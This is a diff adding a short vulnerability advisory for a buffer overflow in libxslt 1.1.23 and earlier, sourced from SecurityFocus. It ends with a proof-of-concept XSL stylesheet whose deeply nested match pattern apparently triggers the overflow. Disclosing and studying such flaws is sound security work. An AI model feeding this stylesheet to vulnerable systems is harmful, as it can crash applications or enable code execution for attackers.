@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/29312/info
+
+The 'libxslt' library is prone to a buffer-overflow vulnerability because the software fails to perform adequate boundary checks on user-supplied data.
+
+An attacker may exploit this issue to execute arbitrary code with the privileges of the user running an application that relies on the affected library. Failed exploit attempts will likely result in denial-of-service conditions.
+
+This issue affects libxslt 1.1.23 and prior versions. 
+
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+<xsl:output method="xml"/>
+
+<xsl:template
+match="html/body/table/tr/td/div/div/div/div/div/div/div/div/table/tr/td/table/tr/td/p/b">
+<xsl:if test="contains(text(), 'published')">
+<found/>
+</xsl:if>
+</xsl:template>
+</xsl:stylesheet> 
